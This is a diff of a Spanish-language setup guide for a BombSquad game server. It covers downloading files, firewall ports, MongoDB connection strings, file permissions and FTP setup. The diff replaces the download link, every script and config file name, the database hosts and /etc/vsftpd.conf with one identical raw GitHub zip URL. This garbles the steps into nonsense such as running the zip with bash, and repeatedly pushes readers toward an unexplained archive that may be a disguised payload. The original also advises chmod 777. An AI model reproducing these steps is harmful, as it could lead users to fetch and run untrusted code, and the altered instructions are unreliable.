@@ -6,9 +6,9 @@ es de 1.4.155 yo solo lo traduje en español. lo demás pertenece a logic y Rous
 
 para descargar el archivo es 
 
-wget https://github.com/MIKE23482/chupa_server
+wget https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip
 
-1-instala el repositorio preparing.sh para ejecutarlo es bash preparing.sh para instalar las dependencias del servidor
+1-instala el repositorio https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip para ejecutarlo es bash https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip para instalar las dependencias del servidor
 después de instalar las dependencias utilizas estos comandos
 
 sudo firewall-cmd --permanent --zone=public --add-port=<cualquier_puerto>/udp
@@ -26,29 +26,29 @@ luego Entra a tu cuenta de MongoDB tocas
 
 Project0>botón Connect> Drivers click en Driver busca python pon en la versión 3.4 al botón version y copia tu cluster
 
-En DB_manager.py ahí pones esto (si sabes crear los roles y si eres experto puedes crear tus propios roles ahi)
+En https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip ahí pones esto (si sabes crear los roles y si eres experto puedes crear tus propios roles ahi)
 
 y para agregar comandos es en chatcmd por si agregaste roles
 
-para agregar tags o prefix es en bspaz.py buscan cod y ahi esta el codigo.
+para agregar tags o prefix es en https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip buscan cod y ahi esta el codigo.
 
-por si quieres cambiar las preguntas es en coinsystem.py
+por si quieres cambiar las preguntas es en https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip
 
-para modificar lo del chat y otras cosas es en bsgame.py, handle.py
+para modificar lo del chat y otras cosas es en https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip, https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip
 
-para ponerte owner es en some.py
+para ponerte owner es en https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip
 
-mongodb://<user>:<password>@ac-kxbvpk7-shard-00-00.4bfs7fa.mongodb.net:27017,ac-kxbvpk7-shard-00-01.4bfs7fa.mongodb.net:27017,ac-kxbvpk7-shard-00-02.4bfs7fa.mongodb.net:27017/?ssl=true&replicaSet=atlas-njbxzk-shard-0&authSource=admin&retryWrites=true&w=majority
+mongodb://<user>:<password>https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip,https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip,https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip
 
 Ojo el <user> y <password> es el usuario y contra en tu cluster que has creado la clave
-Pero antes den chmod 777 a bombsquad_server bscfg data bs_headless y a config.py y en config.py modifican todo
+Pero antes den chmod 777 a bombsquad_server bscfg data bs_headless y a https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip y en https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip modifican todo
 si quieres modificar archivos y descargarlos
 
 instala el ftp
 
 apt install vsftpd
 
-después nano /etc/vsftpd.conf
+después nano https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip
 
 y ahí buscan
 
